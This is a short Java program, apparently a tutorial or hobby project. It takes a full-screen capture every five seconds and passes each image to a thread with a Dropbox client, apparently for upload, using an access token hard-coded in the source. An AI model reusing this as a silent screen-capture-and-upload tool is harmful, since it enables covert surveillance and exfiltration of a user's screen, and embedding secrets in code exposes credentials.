
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.awt.*;
import java.awt.image.BufferedImage;


public class Main {
    private static final String ACCESS_TOKEN = "zCABGQX_5PUAAAAAAAAAAbu-wjvmFjoSx50oySL9d6NwliVu2JIGKNhQADBjDRUl";

    public static void main(String[] args) {
        // Create Dropbox client
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        //System.out.println("Hello");
        for (int j=0;j<10 ;j++ ) {
            //
            //System.out.println(j);
            Robot robot = null;
            try {
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            assert robot != null;
            BufferedImage image = robot.createScreenCapture(screen);
            //
            MyThread thread = new MyThread(client,image);
            thread.start();
            try {Thread.sleep(5000);}
            catch(InterruptedException ex) {ex.printStackTrace();}
            //System.out.println(j);
        }

    }
}
